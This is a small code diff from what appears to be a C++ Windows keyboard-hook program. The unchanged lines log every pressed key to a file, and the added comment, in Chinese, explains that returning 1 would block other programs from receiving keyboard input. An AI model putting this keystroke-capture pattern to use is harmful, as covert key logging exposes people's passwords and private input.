@@ -61,6 +61,7 @@ LRESULT  CALLBACK  KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 			SaveFile << keyNum->vkCode << " : " << char(keyNum->vkCode) << endl;
 		}
 	}
+	//return 1    将阻止其他进程（程序）获取键盘信息
 	return CallNextHookEx(glhHook, nCode, wParam, lParam);
 }
 /*
